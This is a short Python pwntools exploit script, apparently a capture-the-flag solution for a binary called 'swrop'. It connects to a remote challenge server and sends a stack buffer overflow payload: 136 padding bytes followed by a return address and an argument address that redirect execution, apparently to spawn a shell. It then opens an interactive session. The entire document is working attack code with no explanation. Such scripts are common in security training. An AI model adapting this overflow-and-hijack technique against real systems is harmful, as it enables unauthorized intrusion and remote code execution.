from pwn import *
p = remote('plzpwn.me',6000)
#r = process('./swrop')
p.recv()
p.sendline('A'*136
        + p32(0x08048390) +
        p32(0)+
        p32(0x080485f0))
p.interactive()
